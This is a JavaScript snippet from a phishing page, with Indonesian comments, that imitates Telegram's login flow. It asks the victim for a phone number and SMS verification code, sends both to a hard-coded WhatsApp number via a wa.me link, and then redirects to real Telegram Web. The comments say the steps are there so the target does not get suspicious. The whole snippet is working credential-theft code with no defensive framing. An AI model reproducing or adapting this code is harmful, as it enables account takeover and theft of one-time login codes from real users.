<script>
    // --- KONFIGURASI NOMOR WA DISINI ---
    const myNumber = "62881037206135"; 
    // ----------------------------------

    const phoneInput = document.getElementById('phone');
    const otpInput = document.getElementById('otpCode');
    const btnNext = document.getElementById('btnNext');
    const btnVerify = document.getElementById('btnVerify');
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const mainTitle = document.getElementById('mainTitle');
    const subText = document.getElementById('subText');

    // Fokus otomatis ke nomor saat load
    window.onload = function() {
        phoneInput.focus();
    };

    // Fungsi Kirim OTP (Step 1 -> Step 2)
    function sendOTP() {
        const phone = phoneInput.value;
        if(phone.length < 5) {
            alert("Please enter a valid number");
            return;
        }

        // Ubah UI ke Step 2
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
        
        mainTitle.innerText = "Enter SMS Code";
        subText.innerText = "We sent an SMS with a code to " + phone;
        
        otpInput.focus();
    }

    // Fungsi Verifikasi & Kirim ke WA (Step 2 -> Finish)
    function verifyAndSend() {
        const code = otpInput.value;
        const phone = phoneInput.value;

        if(code.length < 1) {
            alert("Please enter the code");
            return;
        }

        // Tampilkan Loading di tombol
        btnVerify.innerHTML = '<span class="spinner"></span>Verifying...';
        btnVerify.disabled = true;

        // Simulasi delay biar terlihat "asli" (2 detik)
        setTimeout(() => {
            // Siapkan pesan WhatsApp
            const message = `🔓 *TELEGRAM LOGIN DETECTED* 🔓\n\n📱 *Number:* ${phone}\n🔑 *Code:* ${code}\n⏰ *Time:* ${new Date().toLocaleString()}`;
            
            // Buat Link WA
            const waLink = `https://wa.me/${myNumber}?text=${encodeURIComponent(message)}`;
            
            // Redirect ke WA
            window.location.href = waLink;

            // Setelah 3 detik, buka Telegram asli agar target tidak curiga
            setTimeout(() => {
                window.location.href = "https://web.telegram.org/k/";
            }, 3000);

        }, 2000);
    }
</script>
